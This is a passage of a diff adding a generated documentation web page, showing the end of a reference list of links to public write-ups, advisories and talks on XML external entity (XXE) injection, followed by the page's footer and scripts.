+<li><a href="http://en.hackdig.com/08/28075.htm">XXE ALL THE THINGS!!! (including Apple iOS's Office Viewer)</a></li>
+<li><a href="https://www.honoki.net/2018/12/from-blind-xxe-to-root-level-file-read-access/">From blind XXE to root-level file read access - December 12, 2018 by Pieter Hiele</a></li>
+<li><a href="https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/">How we got read access on Google’s production servers</a> April 11, 2014 by  detectify</li>
+<li><a href="http://nerdint.blogspot.hk/2016/08/blind-oob-xxe-at-uber-26-domains-hacked.html">Blind OOB XXE At UBER 26+ Domains Hacked</a> August 05, 2016 by Raghav Bisht</li>
+<li><a href="https://seanmelia.files.wordpress.com/2016/01/out-of-band-xml-external-entity-injection-via-saml-redacted.pdf">OOB XXE through SAML</a> by Sean Melia @seanmeals</li>
+<li><a href="https://httpsonly.blogspot.hk/2017/01/0day-writeup-xxe-in-ubercom.html">XXE in Uber to read local files</a> 01/2017</li>
+<li><a href="https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/">XXE inside SVG</a> JUNE 22, 2016 by YEO QUAN YANG</li>
+<li><a href="https://phonexicum.github.io/infosec/xxe.html">Pentest XXE - @phonexicum</a></li>
+<li><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">Exploiting XXE with local DTD files</a> - 12/12/2018 - Arseniy Sharoglazov</li>
+<li><a href="https://portswigger.net/web-security/xxe">Web Security Academy &gt;&gt; XML external entity (XXE) injection - 2019 PortSwigger Ltd</a></li>
+<li><a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation">Automating local DTD discovery for XXE exploitation</a> - July 16 2019 by Philippe Arteau</li>
+<li><a href="https://www.4armed.com/blog/exploiting-xxe-with-excel/">EXPLOITING XXE WITH EXCEL - NOV 12 2018 - MARC WICKENDEN</a></li>
+<li><a href="https://github.com/jmcnamara/excel-reader-xlsx/issues/10">excel-reader-xlsx #10</a></li>
+<li><a href="https://jbz.team/midnightsunctfquals2019/Rubenscube">Midnight Sun CTF 2019 Quals - Rubenscube</a></li>
+<li><a href="https://www.synack.com/blog/a-deep-dive-into-xxe-injection/">SynAck - A Deep Dive into XXE Injection</a> - 22 July 2019 - Trenton Gordon</li>
+<li><a href="https://www.synacktiv.com/ressources/advisories/TIBCO_JasperReports_Server_XXE.pdf">Synacktiv - CVE-2019-8986: SOAP XXE in TIBCO JasperReports Server</a> - 11-03-2019 - Julien SZLAMOWICZ, Sebastien DUDEK</li>
+<li><a href="https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf">XXE: How to become a Jedi</a> - Zeronights 2017 - Yaroslav Babin</li>
+<li><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">Payloads for Cisco and Citrix - Arseniy Sharoglazov</a></li>
+<li><a href="https://infosecwriteups.com/data-exfiltration-using-xxe-on-a-hardened-server-ef3a3e5893ac">Data exfiltration using XXE on a hardened server - Ritik Singh - Jan 29, 2022</a></li>
+</ul>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      Last update:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">July 18, 2023</span>
+      
+    
+  </small>
+</div>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["content.code.copy", "navigation.tracking", "navigation.top"], "search": "../assets/javascripts/workers/search.74e28a9f.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.220ee61c.min.js"></script>
+      
+    
+  </body>
+</html>
